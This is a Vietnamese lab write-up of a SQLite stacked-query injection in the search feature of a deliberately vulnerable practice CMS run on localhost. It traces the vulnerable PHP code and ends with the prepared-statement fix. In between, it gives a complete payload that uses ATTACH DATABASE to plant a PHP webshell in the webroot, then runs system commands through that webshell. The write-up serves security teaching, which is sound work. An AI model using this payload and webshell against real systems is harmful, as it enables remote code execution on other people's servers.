## Hướng 1. SQLite ATTACH DATABASE RCE

### Mô tả

BlueMarket CMS có chức năng tìm kiếm sản phẩm:

```text
Route: /search?q=...
Feature: Product Search + Analytics Cache
```

Mỗi lần user search, app ghi keyword vào SQLite cache để hiển thị lại phần `Recent searches`.

Điểm lỗi nằm ở service ghi cache:

```text
app/src/Services/SqliteCacheService.php
```

Code vulnerable:

```php
$sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $keyword . "', datetime('now'))";
$this->pdo->exec($sql);
```

Với từ khóa bình thường như `dock`, câu SQL thực tế là:

```sql
INSERT INTO search_logs(keyword, created_at)
VALUES ('dock', datetime('now'))
```

Mục tiêu của payload là thoát khỏi chuỗi `keyword`, kết thúc câu `INSERT` hiện
tại, sau đó chèn thêm các câu SQL SQLite khác. Đây là lý do payload phải bắt đầu
bằng một dấu `'` ở vị trí phù hợp, không phải một chuỗi SQL ngẫu nhiên.

Input `q` được nối trực tiếp vào câu SQL SQLite. Vì dùng `exec()`, payload có thể chèn stacked query.

#### Phân tích source và điều kiện cần

Flow trong source:

```text
SearchController::search()
-> lấy $_GET['q']
-> SqliteCacheService::logSearch($q)
-> vulnerable branch ghép q vào INSERT
-> PDO::exec($sql) gửi cả chuỗi cho SQLite
-> recentSearches() đọc lại cache để hiển thị
```

Điểm quyết định nằm ở nhánh mode:

```php
if ($this->mode === 'fixed') {
    $stmt = $this->pdo->prepare(
        'INSERT INTO search_logs(keyword, created_at) VALUES (:keyword, datetime("now"))'
    );
    $stmt->execute(['keyword' => $keyword]);
    return;
}

$sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $keyword . "', datetime('now'))";
$this->pdo->exec($sql);
```

Chain chỉ thực hiện được khi các điều kiện sau cùng đúng:

```text
1. APP_MODE=vulnerable để đi vào nhánh nối chuỗi.
2. Parameter q khác rỗng và đi tới logSearch().
3. PDO SQLite cho phép exec() xử lý nhiều statement.
4. File SQLite cache và thư mục uploads có quyền ghi.
5. Đường dẫn uploads nằm trong webroot để file tạo ra truy cập được qua HTTP.
6. Nginx/PHP-FPM xử lý file .php trong uploads.
```

Nếu chuyển sang fixed mode, `prepare()` coi toàn bộ payload là keyword nên dấu
`;`, `ATTACH` và PHP code không còn được SQLite phân tích như SQL. `ATTACH`
cũng chỉ tạo được file nếu process web có quyền ghi vào thư mục đích.

Chain khai thác:

```text
SQL Injection trong /search?q=
-> stacked query trong SQLite
-> ATTACH DATABASE tạo file .php trong webroot
-> INSERT PHP webshell vào file đó
-> truy cập /uploads/cache.php?cmd=id
-> RCE dưới quyền www-data
```

![alt text](image-huong-1-01-search-page.png)

### Phân tích và khai thác

Đầu tiên truy cập chức năng search bình thường:

```http
GET /search?q=dock HTTP/1.1
Host: localhost:5000
```

Response trả về danh sách sản phẩm và phần analytics cache.

![alt text](image-huong-1-02-normal-search-burp.png)

Thử payload lỗi đơn giản:

**Source tại bước này:** `SearchController::search()` lấy `$_GET['q']` rồi gọi
`SqliteCacheService::logSearch($q)`. Ở vulnerable mode, `logSearch()` ghép `q`
vào string SQL trước khi gọi `PDO::exec()`, nên chỉ một dấu nháy cũng đi thẳng
vào SQLite parser.

```text
'
```

Request:

```http
GET /search?q=' HTTP/1.1
Host: localhost:5000
```

Trong vulnerable mode, câu SQL bị vỡ:

```sql
INSERT INTO search_logs(keyword, created_at) VALUES (''', datetime('now'))
```

Nếu response hiển thị lỗi SQLite, ta xác nhận được tham số `q` đi vào SQL parser.

![alt text](image-huong-1-03-single-quote-error.png)

Tiếp theo kiểm tra stacked query bằng payload an toàn:

**Source tại bước này:** vẫn là câu `INSERT` trong `logSearch()`. Vì source mở
chuỗi bằng `VALUES ('` và đóng bằng `', datetime('now'))`, payload phải tự đóng
giá trị keyword trước khi thêm statement `INSERT` thứ hai.

```sql
x', datetime('now')); INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now')); --
```

Payload được ráp từ các mảnh nhỏ:

```text
x', datetime('now'));       đóng giá trị keyword và kết thúc INSERT gốc
INSERT INTO ...              câu INSERT thứ hai để tạo bằng chứng
--                             comment phần SQL còn dư do ứng dụng nối thêm
```

Sau khi ứng dụng nối `q` vào query, SQLite nhận được tương đương:

```sql
INSERT INTO search_logs(keyword, created_at)
VALUES ('x', datetime('now'));
INSERT INTO search_logs(keyword, created_at)
VALUES ('sqli_stacked_ok', datetime('now'));
--', datetime('now'))
```

Câu đầu là phần query gốc đã được đóng đúng, câu thứ hai ghi marker vào cache,
còn `--` vô hiệu hóa phần `', datetime('now'))` còn lại của query gốc. Nếu
`sqli_stacked_ok` xuất hiện trong `Recent searches`, ta đã chứng minh được
stacked query trước khi thử ghi file.

Gửi bằng Burp Repeater:

```http
GET /search?q=<URL_ENCODED_PAYLOAD> HTTP/1.1
Host: localhost:5000
```

Sau đó mở lại `/search`, nếu phần `Recent searches` có dòng `sqli_stacked_ok` thì stacked query đã chạy.

![alt text](image-huong-1-04-stacked-query-proof.png)

Câu SQL gốc có dạng:

```sql
INSERT INTO search_logs(keyword, created_at) VALUES ('<q>', datetime('now'))
```

Ta cần đóng phần keyword trước:

```sql
x', datetime('now'));
```

Sau đó dùng `ATTACH DATABASE` để tạo file trong webroot:

```sql
ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
```

SQLite sẽ tạo file `cache.php` như một SQLite database mới. Vì file nằm trong `public/uploads`, có thể truy cập qua HTTP.

Tiếp tục tạo bảng trong attached database:

```sql
CREATE TABLE IF NOT EXISTS shell.payload (code TEXT);
```

Chèn PHP webshell vào file:

```sql
INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>');
```

Dấu `'` bên trong PHP phải escape thành `''` để không làm vỡ chuỗi SQL.

Payload hoàn chỉnh:

**Source tại bước này:** `PDO::exec()` cho phép gửi chuỗi có nhiều statement,
còn SQLite `ATTACH DATABASE` có thể tạo file tại đường dẫn mà process web ghi
được. Vì vậy payload mở rộng từ marker trước đó bằng `ATTACH`, tạo bảng và
ghi PHP vào database file.

```sql
x', datetime('now')); ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell; CREATE TABLE IF NOT EXISTS shell.payload (code TEXT); DELETE FROM shell.payload; INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>'); --
```

Đây là cùng primitive vừa kiểm tra, chỉ thay câu `INSERT` marker bằng bốn bước
ghi webshell:

```text
1. đóng INSERT gốc
2. ATTACH DATABASE tạo cache.php
3. CREATE TABLE tạo nơi lưu nội dung
4. DELETE dọn dữ liệu cũ nếu file đã tồn tại
5. INSERT ghi PHP vào bảng attached
6. -- comment phần query còn dư
```

Query SQLite sau khi nối payload có dạng:

```sql
INSERT INTO search_logs(keyword, created_at)
VALUES ('x', datetime('now'));
ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
CREATE TABLE IF NOT EXISTS shell.payload (code TEXT);
DELETE FROM shell.payload;
INSERT INTO shell.payload
VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>');
--', datetime('now'))
```

Hai dấu nháy liên tiếp trong `$_GET[''cmd'']` và `''id''` là cách escape dấu
nháy bên trong PHP string của SQLite. Sau khi file được tạo, HTTP request tới
`/uploads/cache.php` mới là bước thực thi PHP; payload SQL chỉ tạo file.

**Vì sao payload Hướng 1 kết thúc bằng `--`?**

Query gốc luôn còn phần này ở phía sau giá trị `q`:

```sql
INSERT INTO search_logs(keyword, created_at)
VALUES ('<q>', datetime('now'))
```

Sau khi payload đóng `keyword` và chạy các statement riêng, ứng dụng vẫn nối
phần còn lại `', datetime('now'))`. Query đầy đủ có dạng:

```sql
INSERT INTO search_logs(keyword, created_at)
VALUES ('x', datetime('now'));
ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
CREATE TABLE IF NOT EXISTS shell.payload (code TEXT);
DELETE FROM shell.payload;
INSERT INTO shell.payload
VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>');
--', datetime('now'))
```

`--` biến phần `', datetime('now'))` còn dư thành comment SQLite. Nếu bỏ `--`,
phần dư có thể làm hỏng câu lệnh cuối. Hướng 1 không cần thêm `SELECT ...`
ở cuối vì `SqliteCacheService` chỉ gọi `PDO::exec()` để ghi cache, không cần
trả về một result set cho view. Việc chạy PHP xảy ra ở request HTTP sau đó,
không phải trong câu SQL này.

Gửi payload bằng Burp:

```http
GET /search?q=<URL_ENCODED_PAYLOAD> HTTP/1.1
Host: localhost:5000
```

Trong Burp có thể paste payload vào parameter `q`, sau đó URL-encode value.

![alt text](image-huong-1-05-attach-database-payload.png)

Sau khi request tạo file thành công, truy cập webshell:

```http
GET /uploads/cache.php?cmd=id HTTP/1.1
Host: localhost:5000
```

Thử thêm các lệnh an toàn:

```http
GET /uploads/cache.php?cmd=whoami HTTP/1.1
Host: localhost:5000
```

```http
GET /uploads/cache.php?cmd=pwd HTTP/1.1
Host: localhost:5000
```

Kết quả mong đợi:

```text
www-data
/var/www/html/public
```

![alt text](image-huong-1-06-rce-proof.png)

Sau khi demo xong, cleanup file webshell:

```powershell
docker compose exec web rm -f /var/www/html/public/uploads/cache.php
```

![alt text](image-huong-1-07-cleanup.png)

### Root cause

Lỗi chính là app nối trực tiếp input `q` vào SQL SQLite:

```text
1. User kiểm soát parameter q.
2. q được đưa thẳng vào INSERT bằng string concatenation.
3. PDO exec() cho phép chạy stacked query.
4. SQLite ATTACH DATABASE có thể tạo file mới trên filesystem.
5. Thư mục uploads nằm trong webroot và file .php được PHP-FPM xử lý.
```

Trong fixed mode, code dùng prepared statement:

```php
$stmt = $this->pdo->prepare('INSERT INTO search_logs(keyword, created_at) VALUES (:keyword, datetime("now"))');
$stmt->execute(['keyword' => $keyword]);
```

Khi đó payload chỉ còn là dữ liệu keyword, không thể trở thành cú pháp SQL.

Tóm tắt root cause:

```text
1. SQL Injection do nối chuỗi.
2. Dùng exec() cho dữ liệu user-controlled.
3. Webroot cho phép ghi file thông qua SQLite ATTACH.
4. Upload/public path cho phép execute PHP.
5. Thiếu tách biệt giữa vùng lưu dữ liệu và vùng có thể thực thi code.
```
